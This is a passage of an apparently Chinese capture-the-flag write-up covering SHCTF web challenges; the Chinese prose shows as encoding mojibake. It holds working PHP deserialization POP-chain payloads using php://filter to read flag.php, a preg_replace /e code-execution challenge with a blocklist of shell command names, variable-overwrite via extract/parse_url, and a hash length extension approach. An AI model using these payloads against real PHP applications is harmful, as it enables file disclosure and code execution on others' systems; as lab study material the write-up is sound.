class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂæóÂà∞<br><code>O:1:&quot;B&quot;:1:&#123;s:1:&quot;q&quot;;O:1:&quot;C&quot;:2:&#123;s:3:&quot;var&quot;;N;s:1:&quot;z&quot;;O:1:&quot;D&quot;:1:&#123;s:1:&quot;p&quot;;O:1:&quot;A&quot;:1:&#123;s:5:&quot;var_1&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;&#125;&#125;&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/e6a723da29b5436689b78b35619a18c3.png" alt="2"></p><h3 id="WEEK1-ÁôªÂΩïÂ∞±Áªôflag"><a href="#WEEK1-ÁôªÂΩïÂ∞±Áªôflag" class="headerlink" title="[WEEK1]ÁôªÂΩïÂ∞±Áªôflag"></a>[WEEK1]ÁôªÂΩïÂ∞±Áªôflag</h3><p><img src="https://img-blog.csdnimg.cn/ffb2aac663074c77ab96fcb980ccc273.png" alt="12"><br>Áî®Êà∑ÂêçÂØÜÁ†Åadmin&#x2F;password<br><img src="https://img-blog.csdnimg.cn/cb6374f9e73f41dcad4f2f3a301bba83.png" alt="2"></p><h3 id="WEEK1-È£ûÊú∫Â§ßÊàò"><a href="#WEEK1-È£ûÊú∫Â§ßÊàò" class="headerlink" title="[WEEK1]È£ûÊú∫Â§ßÊàò"></a>[WEEK1]È£ûÊú∫Â§ßÊàò</h3><p>flagÂ∞±Âú®ÂâçÁ´ØÔºåÊâæÂ∞±Ë°å‰∫Ü„ÄÇ<br><img src="https://img-blog.csdnimg.cn/eb16f34b08574889a6c83f04750bb711.png" alt="1"><br>Ëß£Á†Å‰∏Ä‰∏ãunicode-&gt;base64-&gt;flag„ÄÇ</p><h3 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h3><p>Áü•ËØÜÁÇπÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pattern</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pattern'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$pattern</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'print_r("\\1")'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you are smart"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"try again"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"it is begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Âõ†‰∏∫Â≠óÁ¨¶‰∏≤‰∏≠ÁöÑÁâπÊÆäÂ≠óÁ¨¶ÈúÄË¶ÅËΩ¨‰πâÔºåÊâÄ‰ª•<code>\\1</code>ÂÆûÈôÖ‰∏äÂ∞±ÊòØ<code> \1</code>, ËÄå <code>\1</code> Âú®Ê≠£ÂàôË°®ËææÂºè‰∏≠Ë°®Á§∫ÂèçÂêëÂºïÁî®„ÄÇ</p><blockquote><p>ÂØπ‰∏Ä‰∏™Ê≠£ÂàôË°®ËææÂºèÊ®°ÂºèÊàñÈÉ®ÂàÜÊ®°Âºè‰∏§ËæπÊ∑ªÂä†ÂúÜÊã¨Âè∑Â∞ÜÂØºËá¥Áõ∏ÂÖ≥ÂåπÈÖçÂ≠òÂÇ®Âà∞‰∏Ä‰∏™<strong>‰∏¥Êó∂ÁºìÂÜ≤Âå∫</strong>‰∏≠ÔºåÊâÄÊçïËé∑ÁöÑÊØè‰∏™Â≠êÂåπÈÖçÈÉΩÊåâÁÖßÂú®Ê≠£ÂàôË°®ËææÂºèÊ®°Âºè‰∏≠‰ªéÂ∑¶Âà∞Âè≥Âá∫Áé∞ÁöÑÈ°∫Â∫èÂ≠òÂÇ®„ÄÇÁºìÂÜ≤Âå∫ÁºñÂè∑‰ªé<code>1</code>ÂºÄÂßãÔºåÊúÄÂ§öÂèØÂ≠òÂÇ®<code>99</code>‰∏™ÊçïËé∑ÁöÑÂ≠êË°®ËææÂºè„ÄÇÊØè‰∏™ÁºìÂÜ≤Âå∫ÈÉΩÂèØ‰ª•‰ΩøÁî®<code>\n</code> ËÆøÈóÆÔºåÂÖ∂‰∏≠ n ‰∏∫‰∏Ä‰∏™Ê†áËØÜÁâπÂÆöÁºìÂÜ≤Âå∫ÁöÑ‰∏Ä‰ΩçÊàñ‰∏§‰ΩçÂçÅËøõÂà∂Êï∞„ÄÇ</p></blockquote><p>ÂºïÂÖ•‰∏Ä‰∏™‰æãÂ≠êÁêÜËß£‰∏Ä‰∏ã<a href="https://xz.aliyun.com/t/2557">Ê∑±ÂÖ•Á†îÁ©∂preg_replace‰∏é‰ª£Á†ÅÊâßË°å</a></p><table><thead><tr><th>Ê≠£ÂàôË°®ËææÂºè</th><th>Âê´‰πâ</th></tr></thead><tbody><tr><td><code>.</code></td><td>ÂåπÈÖçÈô§Êç¢Ë°åÁ¨¶‰ª•Â§ñÁöÑ‰ªªÊÑèÂ≠óÁ¨¶</td></tr><tr><td><code>\s</code></td><td>ÂåπÈÖç‰ªªÊÑèÁöÑÁ©∫ÁôΩÁ¨¶</td></tr><tr><td><code>\S</code></td><td>ÂåπÈÖç‰ªª‰ΩïÈùûÁ©∫ÁôΩÂ≠óÁ¨¶</td></tr><tr><td><code>+</code></td><td>ÂåπÈÖçÂâçÈù¢ÁöÑÂ≠êË°®ËææÂºè‰∏ÄÊ¨°ÊàñÂ§öÊ¨°</td></tr></tbody></table><p><img src="https://img-blog.csdnimg.cn/363feed2972e432a8558d32102c4a1bf.png" alt="1"></p><h3 id="WEEK1-ÁîüÊàê‰Ω†ÁöÑÈÇÄËØ∑ÂáΩÂêß"><a href="#WEEK1-ÁîüÊàê‰Ω†ÁöÑÈÇÄËØ∑ÂáΩÂêß" class="headerlink" title="[WEEK1]ÁîüÊàê‰Ω†ÁöÑÈÇÄËØ∑ÂáΩÂêß~"></a>[WEEK1]ÁîüÊàê‰Ω†ÁöÑÈÇÄËØ∑ÂáΩÂêß~</h3><p><img src="https://img-blog.csdnimg.cn/72cb3c9f90a8402b9a32ef9287dd9387.png" alt="1"><br>ÊåâÁÖß‰ªñËØ¥ÁöÑÂæóÂà∞ÁöÑÂõæÁâá‰∏ãÈù¢Â∞±ÊòØflag„ÄÇ</p><h3 id="WEEK2-MD5ÁöÑ‰∫ãÂ∞±ÊãúÊâò‰∫Ü"><a href="#WEEK2-MD5ÁöÑ‰∫ãÂ∞±ÊãúÊâò‰∫Ü" class="headerlink" title="[WEEK2]MD5ÁöÑ‰∫ãÂ∞±ÊãúÊâò‰∫Ü"></a>[WEEK2]MD5ÁöÑ‰∫ãÂ∞±ÊãúÊâò‰∫Ü</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag is"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>È¶ñÂÖàÈÄöËøáÁ¨¨‰∏Ä‰∏™if</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$$$scheme</span><span class="token operator">===</span><span class="token string single-quoted-string">'SHCTF'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáå<code>extract(parse_url($_POST[&#39;SHCTF&#39;]));</code>ÊòØÂ∞Ü‰º†ÂÖ•ÁöÑSHCTFÂÄºÁöÑ‰∏ÄÈÉ®ÂàÜÂÜç‰Ωú‰∏∫ÂèÇÊï∞„ÄÇ<code>extract</code>‰ºöÊ∂âÂèäÂà∞ÂèòÈáèË¶ÜÁõñÊºèÊ¥û<br>ÂèÇËÄÉËµÑÊñô<a href="https://www.cnblogs.com/xhds/p/12587249.html#_label5">PHP‰∏≠ÁöÑÂèòÈáèË¶ÜÁõñÊºèÊ¥û</a><br>Âú®ËøôÈáåÂÅö‰∏Ä‰∏™ÊµãËØïÔºö<br>ÊØîÂ¶ÇËØ¥Ëøô‰∏ÄÊÆµ‰ª£Á†Å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'http://sd.com:12/as.php?s=456'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*ÊâìÂç∞ÁªìÊûúÔºöArray(    [scheme] => http    [host] => sd.com    [port] => 12    [path] => /as.php    [query] => s=456)*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáåÊàë‰ª¨Â∞Ü<code>http</code>Êîπ‰∏∫<code>host</code>ÔºåÂ∞Ü<code>sd.com</code>Êîπ‰∏∫<code>query</code>ÔºåÂ∞Ü<code>s=456</code>Êîπ‰∏∫<code>SHCTF</code><br>‰πüÂ∞±ÊòØ‰ª•‰∏ã‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'host://query/sd.php?SHCTF'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*ËøêË°åÁªìÊûúÔºöArray(    [scheme] => host    [host] => query    [path] => /sd.php    [query] => SHCTF)*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøôÈáåÊ≠£Â•ΩÂÆûÁé∞‰∏âÊ¨°ÂèòÈáèË¶ÜÁõñÔºåËæìÂá∫‰∫ÜflagÁöÑmd5ÂÄº<br><img src="https://img-blog.csdnimg.cn/c14c045f09a9418bb0382e89e8f99724.png" alt="1"><br>Êé•‰∏ãÊù•ÈÄöËøá‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">!=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Ëøô‰∏™Â•ΩÂºÑÔºåÂ∞±ÊòØÂ∞ÜlengthËµãÂÄº‰∏∫Â∏¶Êúâ‰∏â‰ΩçÂ∞èÊï∞ÁöÑÊï∞ÂÄº<code>length=132.456</code>ÔºåËøîÂõûflagÈïøÂ∫¶42„ÄÇ</p><blockquote><p>Âà∞ËøôÂ∑≤ÁªèÁü•ÈÅì‰∫ÜÔºö<br>flag.md5&#x3D;2f679a35b591a420d8cc6b60f90d3fb1<br>flag.length&#x3D;42</p><p>ÂêéÈù¢Ëøô‰∏™ÂÖ∂ÂÆû‰πüÁü•ÈÅì<code>ÂìàÂ∏åÊãìÂ±ïÊîªÂáª</code>ÔºåÂèØÊòØÂ•ΩÂÉèÊâæÁöÑËÑöÊú¨‰∏çËÉΩÁî®‰∫Ü„ÄÇÂîâÔºåÂ§çÁé∞‰∏Ä‰∏ã„ÄÇ„ÄÇ„ÄÇ<br>‰ΩøÁî®ËÑöÊú¨Ôºà<a href="https://github.com/shellfeel/hash-ext-attack">ËÑöÊú¨Âú∞ÂùÄ</a>Ôºâ<br><img src="https://img-blog.csdnimg.cn/2d34bb2cb1de4c5085c00c2ebca01da1.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/d4c7e7d9e3674f8694e493d9d887fc01.png" alt="3"></p></blockquote><h3 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="[WEEK2]serialize"></a>[WEEK2]serialize</h3><p>Áü•ËØÜÁÇπÔºöÊµÖÊã∑Ë¥ù„ÄÅÂèçÂ∫èÂàóÂåñ<br>ÂàÜ‰∫´ÊñáÁ´†Ôºö<a href="https://blog.csdn.net/crisprx/article/details/104457047">‰ªé‰∏§ÈÅìÈ¢òÁõÆÊµÖË∞àPHPÊ∑±ÊµÖÊã∑Ë¥ù</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fei</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">miaomiao</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token string single-quoted-string">'Mikey Mouse~'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">dong</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token string double-quoted-string">"misca~musca~milaoshu~~~"</span><span class="token punctuation">;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^O:\d+/'</span><span class="token punctuation">,</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"you should think harder!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"wanna_fl.ag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂèàÊòØ‰∏ÄÈÅìÂèçÂ∫èÂàóÂåñÈ¢òÁõÆÔºå‰∏ç‰ºöÂ∞±Â§öË°•Ë°•„ÄÇ<br>‰∏≤‰∏Ä‰∏ãÈìæÂ≠êÔºö</p><blockquote><p>musca-&gt;misca-&gt;milaoshu<br>ÊúÄÂêé‰ΩøÁî®php‰º™ÂçèËÆÆÊù•ËØªÂèñflag.phpÊñá‰ª∂„ÄÇ</p></blockquote><p><img src="https://img-blog.csdnimg.cn/d498fd23f9f1421ab5eda7a7459ab1a1.png" alt="123"><br>ÈìæÂ≠êÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">misca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$gao</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fei</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">gao</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span><span class="token comment">//ÈáçÁÇπ</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">musca</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$ding</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dong</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">milaoshu</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$v</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">musca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">misca</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">ding</span><span class="token operator">-></span><span class="token property">fei</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">milaoshu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//arrayÁªïËøáÊï∞ÁªÑ</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="WEEK3-sseerriiaalliizzee"><a href="#WEEK3-sseerriiaalliizzee" class="headerlink" 